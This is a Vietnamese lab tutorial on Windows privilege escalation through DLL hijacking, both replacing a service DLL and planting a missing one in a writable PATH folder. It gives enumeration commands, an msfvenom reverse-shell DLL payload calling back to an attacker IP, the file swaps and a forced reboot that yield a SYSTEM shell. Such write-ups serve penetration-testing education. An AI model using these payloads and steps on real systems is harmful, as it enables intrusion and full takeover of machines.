## DLL Hijacking

DLL (Dynamic Link Library) là một thư viện chứa mã và dữ liệu có thể được nhiều chương trình sử dụng cùng một lúc. Về cơ bản, DLL là một tập hợp các hướng dẫn tồn tại bên ngoài mã trong một tệp thực thi nhưng được yêu cầu để tệp thực thi đó hoạt động.

Khi một chương trình được viết, người ta thường thấy rằng các tệp DLL đang được tải bằng cách không sử dụng đường dẫn tuyệt đối của chúng. Điều này có nghĩa là thay vì đặt **C:\Windows\System32\important.dll** vào mã để lấy DLL trực tiếp từ thư mục System32, các lập trình viên sẽ chỉ đặt 'important.dll' và cho phép Windows tự tìm thấy DLL. Điều này đặc biệt đúng với các chương trình của bên thứ ba.

Khi chúng tôi KHÔNG chỉ định đường dẫn đầy đủ của thư viện mà chúng tôi muốn tải, hệ thống sẽ sử dụng thứ tự tìm kiếm được xác định trước để cố gắng tìm nó, như sau:

![image-2](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/c5f097ff-255e-4653-8a03-7e2dd24c989f)

Thứ tự tìm kiếm được xác định trước bắt đầu bằng Thư mục của Ứng dụng; tuy nhiên, “tìm kiếm trước” đã được liệt kê ở trên để cho thấy rằng nếu tên của DLL KHÔNG phải là DLL đã được tải trong bộ nhớ và KHÔNG phải là DLL đã biết thì đó là khi tìm kiếm bắt đầu tại Thư mục của Ứng dụng.

# DLL Hijacking – DLL Replacement

Việc thay thế DLL được khai thác giống như cách chúng tôi khai thác các quyền của tệp dịch vụ yếu, điểm khác biệt duy nhất là thay vì thay thế tệp thực thi dịch vụ, chúng tôi sẽ thay thế một tệp DLL (hoặc đặt một tệp bị thiếu) mà tệp thực thi gọi trong khi thực thi.

Trong ví dụ này, chúng tôi vừa có được chỗ đứng trên nạn nhân với tư cách là người dùng alice sau khi chúng tôi tìm thấy thông tin xác thực của cô ấy trong thư mục chia sẻ.

![image-4](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/2928386d-53a4-46ce-82dc-e997e2a737b2)

Nâng cấp lên PowerShell bằng lệnh **powershell -ep bypass**

# Hunting for Non-Standard Services

Để bắt đầu, chúng tôi sẽ cần tìm một dịch vụ đang chạy từ một vị trí không chuẩn nơi chúng tôi có thể có quyền ghi.

Các dịch vụ thực thi từ các vị trí không chuẩn sẽ mang đến cho chúng tôi cơ hội tốt nhất để tìm ra các quyền dịch vụ yếu.

Từ PowerShell, chúng tôi có thể sử dụng lệnh wmic sau để tìm bất kỳ dịch vụ nào đang thực thi từ các vị trí không chuẩn:

```
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where { $_.PathName -notlike "C:\Windows*" } | select Name,DisplayName,StartMode,PathName
```
![image-6](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/ad567962-a41a-4b43-9c3f-eba71e2c327c)

Ở đây chúng ta có thể thấy rằng **dllservice** nổi bật vì những lý do rõ ràng. Tuy nhiên, ngay cả khi dịch vụ được gọi bằng tên khác, bằng cách nhìn vào PathName, chúng ta có thể thấy rằng dịch vụ này có thể nằm trong một thư mục có thể ghi. Ngoài ra, ở đây chúng ta có thể thấy rằng dịch vụ này là dịch vụ tự động khởi động, có nghĩa là chúng ta có thể kích hoạt khởi động lại dịch vụ này nếu có thể khởi động lại máy.

# Hunting for Weak Service Folder Permissions

Tôi có thể sử dụng một công cụ có tên **Accesschk** từ Bộ công cụ Sysiternals để liệt kê các quyền của tệp và thư mục.

Với accesschk trên hệ thống, chúng ta muốn liệt kê các quyền trên thư mục dịch vụ, như sau:

```
.\accesschk64.exe -wvud "C:\Program Files\dllservice" -accepteula
```
![image-7](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/b3ea8b13-a9a6-45ea-af60-f6cd3e5b8d7d)

Ở đây chúng ta có thể thấy rằng Người dùng được xác thực có FILE_ALL_ACCESS trên thư mục này, nghĩa là tất cả người dùng đều có Toàn quyền kiểm soát tại đây.

Bây giờ, khi kiểm tra nội dung của thư mục, chúng ta có thể thấy rằng có cả tệp thực thi và tệp DLL, chúng ta có thể giả định một cách an toàn rằng tệp DLL được tệp thực thi tải khi dịch vụ khởi động.

![image-8](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/12b93f74-95a5-497e-8697-0dd12725a9db)

# Sử dụng Procmon để hiểu cách thực thi tải DLL

Để sử dụng procmon.exe, chúng tôi cần đăng nhập với tư cách Quản trị viên và có quyền truy cập GUI. Vì lý do này, đây chỉ là bằng chứng về khái niệm cho thấy cách các tệp DLL được tải vào một quy trình.

Sau khi đăng nhập vào máy với tư cách Administrator, chúng ta cần chuyển bản sao **procmon64.exe** vào máy nạn nhân. Sau khi chuyển, hãy chạy Procmon với tư cách quản trị viên và chấp nhận thỏa thuận EULA.

![image-9](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/79a7b6e9-33a5-4d29-9ddd-16bb0e76b3a4)

Khi Procmon đang chạy, chúng ta cần tạo một vài bộ lọc bằng cách nhấn **CTRL + L :
Đường dẫn – kết thúc bằng – .dll**

![image-10](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/715a8d5c-f229-4726-8afe-200d9e210310)

**Người dùng – là – NT AUTHORITY\SYSTEM**

![image-11](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/72dc2f13-90dc-4abb-b691-2d9f69263d4b)

**Tên quy trình – là – dllservice.exe**

![image-13](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/680272fb-0762-40b3-a60b-9650e2fa55a1)

Bây giờ chúng ta sẽ kích hoạt ba bộ lọc sau:

![image-14](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/62325554-360b-490d-8217-75dc10399400)

Bây giờ, khi chúng tôi dừng và khởi động dịch vụ, chúng tôi thấy rằng hijackme.dll tải thành công từ thư mục ứng dụng, như dự định.

![image-12](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/32e77110-f35d-41c6-9f45-b3bc0bce3b1e)

Bây giờ chúng ta đã thấy POC của DLL tải thành công từ thư mục ứng dụng

# Tạo một DLL độc hại bằng msfvenom

Vì chúng tôi đã tìm thấy một dịch vụ dễ bị tấn công tải một DLL được tìm thấy trong thư mục ứng dụng, nên chúng tôi có thể tiến hành tạo một DLL độc hại để thay thế một DLL hợp pháp và nhận shell HỆ THỐNG.

Từ máy tấn công của chúng tôi, chúng tôi có thể sử dụng lệnh msfvenom sau để tạo một DLL độc hại:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f dll -o hijackme.dll
```
![image-16](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/ab62fdd9-eba8-40b1-92b7-35b325e59d1c)

Với DLL độc hại đã sẵn sàng hoạt động, chúng ta cần chuyển nó đến nạn nhân từ shell đảo ngược của chúng ta dưới dạng alice.

# Chiếm quyền điều khiển DLL dịch vụ để lấy SYSTEM Shell

Trở lại shell của chúng tôi với tư cách là Alice, chúng tôi đã chuyển DLL độc hại và chúng tôi đã sẵn sàng thiết lập việc khai thác.

![image-17](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/d60a0584-70f6-4298-8794-e8f08ad1aa11)

Tiếp theo, chúng ta cần tạo một bản sao lưu của 'hijackme.dll' ban đầu và sau đó di chuyển tệp độc hại vào thư mục ứng dụng.

```
mv "C:\Program Files\dllservice\hijackme.dll" "C:\Program Files\dllservice\hijackme.dll.bak"

mv .\hijackme.dll "C:\Program Files\dllservice"
```
![image-18](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/fdc2602c-7065-48d2-b261-e3ad97e04fe0)

Bây giờ chúng ta đã thả DLL độc hại vào thư mục, tất cả những gì còn lại cần làm là khởi động trình nghe netcat trên máy tấn công qua cổng 443 và sau đó sử dụng lệnh sau để khởi động lại máy nạn nhân:

```
shutdown /r /t 0 /f
```
![image-19](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/7b3906e3-ed73-4879-9e89-480bb30bb437)

Chúng tôi khởi động ra khỏi shell, điều này cho thấy quá trình khởi động lại đã thành công; và sau khoảng 20 giây, quay lại trình nghe của chúng tôi, chúng tôi nhận được shell HỆ THỐNG!

![image-20](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/832c4e8e-c4ec-48f9-869a-04271ac5fc8f)

Để tính năng này hoạt động, chúng ta cần thêm một mục tùy chỉnh vào biến PATH trỏ đến thư mục mà chúng ta có quyền ghi.

Khi một số ứng dụng của bên thứ ba được cài đặt, chúng sẽ cập nhật biến PATH với thư mục mà ứng dụng thực thi từ đó. Nếu may mắn, chúng ta có thể thấy rằng mình có quyền ghi vào thư mục này. Ví dụ: nếu ứng dụng tạo thư mục trong thư mục C:\ thì theo mặc định, bất kỳ người dùng chuẩn nào cũng có (M) Quyền sửa đổi trên thư mục.

Trong ví dụ này, chúng ta sẽ thấy rằng thư mục **dllservice** chỉ chứa tệp thực thi cho dịch vụ và DLL không có trong thư mục ứng dụng như trước đây.

![image-24](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/733892d2-6f48-421e-a4ba-b487f7856287)

Ngoài ra, chúng tôi không có quyền ghi vào thư mục dllservice với tư cách là người dùng chuẩn.

![image-26](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/cfd42aed-3193-44bc-9577-946a3ba68ce6)

# Liệt kê các thư mục trong biến PATH

Quay lại shell của chúng ta với tư cách là Alice, chúng ta có thể kiểm tra các thư mục trong biến PATH bằng lệnh sau từ lời nhắc PowerShell:

```
$Env:Path
```
![image-21](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/4df6b8b4-823e-4d24-a0df-010305b0057c)

Để thực hiện tương tự từ dấu nhắc cmd.exe, chúng tôi sẽ sử dụng lệnh sau:

```
echo %PATH%
```
![image-22](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/0ac5cb02-e1e9-494e-8498-1e0bccb0a8f3)

BÙM! Ở đây chúng ta có thể thấy một thư mục xuất hiện dưới dạng thư mục không mặc định trong PATH; và thậm chí tốt hơn nữa, thư mục này nằm ở C:\ vì vậy chúng ta phải có quyền ghi ở đây theo mặc định, điều này chúng ta có thể nhanh chóng xác nhận bằng accesschk .

```
.\accesschk64.exe -wvud "C:\customapp" -accepteula
```
![image-23](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/d6be13dd-6308-444c-a6f1-09740c814ebf)

Và đúng như chúng tôi dự đoán, vì thư mục này nằm trong C:\ nên người dùng tiêu chuẩn có thể ghi vào thư mục này!

Ngoài ra, có một thủ thuật mà chúng ta có thể sử dụng để chạy vòng lặp for nhằm lặp lại từng thư mục trong biến PATH trong khi chạy icacls đối với từng thư mục đó để xác định xem chúng ta có quyền ghi hay không. Theo mặc định, các thư mục trong biến PATH đều không thể ghi được đối với người dùng chuẩn; tuy nhiên, bất kỳ thư mục tùy chỉnh nào cũng có thể ghi được hoặc trong một số trường hợp rất hiếm, người dùng có thể đã được cấp quyền ghi vào một trong các thư mục mặc định.

```
for %A in ("%path:;=";"%") do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
![image-25](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/f5167fe2-0003-4672-b3cd-465647eb6d6d)

Ở đây chúng ta có thể thấy rằng thư mục duy nhất mà chúng ta có quyền ghi (sửa đổi) trong PATH là thư mục **C:\customapp** .

Vậy điều này giúp ích như thế nào khi chúng ta khởi động dllservice, nằm ở **C:\Program Files\dllservice** và không liên quan gì đến thư mục **customapp** ?

Hãy cùng sử dụng Procmon lần nữa để tìm hiểu nhé!

# Sử dụng Procmon để hiểu cách các tệp thực thi tìm kiếm các tệp DLL bị thiếu

Để thấy điều này hoạt động và hiểu rõ hơn về nó, chúng ta sẽ quay lại phiên GUI của Quản trị viên và chạy lại Procmon.

Lần này, chúng ta không có DLL trong thư mục của ứng dụng nên sẽ cần thêm một bộ lọc khác để xem chương trình xử lý một DLL bị thiếu như thế nào.

**Kết quả – Chứa – KHÔNG TÌM THẤY**

![image-27](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/1aa605d4-0991-4eba-a721-9af6c4d3640d)

Bây giờ chúng ta sẽ có bốn thiết lập bộ lọc sau:

![image-29](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/f6b0ebd1-37c0-4472-97f2-219016b07054)

Lần này khi dừng và khởi động dịch vụ, trước tiên chúng ta sẽ thấy hijackme.dll cố tải từ thư mục Ứng dụng. Khi không tìm thấy DLL, nó sẽ tiến hành thực hiện thứ tự tìm kiếm được xác định trước. Khi nó đi qua các thư mục C:\Windows\*, nó bắt đầu kiểm tra biến %PATH% nơi nó sẽ cố tải DLL từ **C:\customap**p .

![image-31](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/02f496b5-7cfb-4858-b311-53e849826e59)

Tuyệt vời! Ở đây, chúng ta có thể thấy rằng ứng dụng đã cố tải DLL từ thư mục ứng dụng tùy chỉnh trong quá trình tìm kiếm vì nó nằm trong %PATH% của chúng ta. Điều này có nghĩa là chúng tôi có thể đặt phiên bản độc hại của **hijckme.dll** vào thư mục đó và khởi động lại dịch vụ. Sau khi thực hiện xong bước kiểm tra đó, nó sẽ “tìm DLL” và thực thi tải trọng của chúng tôi và cung cấp cho chúng tôi shell HỆ THỐNG.

# Bỏ Phantom DLL để lấy SYSTEM Shell

Quay lại shell người dùng tiêu chuẩn của chúng tôi với tư cách là người dùng alice, giờ đây chúng tôi có thể khai thác dịch vụ này để có được shell HỆ THỐNG.

Vì chúng tôi đã tạo tệp DLL độc hại trước đó nên chúng tôi chỉ cần sao chép nó vào thư mục ứng dụng tùy chỉnh rồi khởi động lại máy.

![image-32](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/69446cb9-a512-42d4-97c3-b7793607efaf)

Bây giờ tệp đã được sao chép vào thư mục customapp, bây giờ tất cả những gì chúng ta cần làm là khởi động trình nghe netcat trên cổng 443 rồi khởi động lại máy, giống như lần trước.

```
shutdown /r /t 0 /f
```

![image-19](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/4a211102-c611-4038-ac2c-8ac86ebf55a5)

Chúng tôi lại khởi động ra khỏi shell và sau khoảng 20 giây, quay lại trình nghe, chúng tôi có shell HỆ THỐNG!

![image-20](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/c67f5acf-8aa0-4060-8007-e809a9a1c23b)
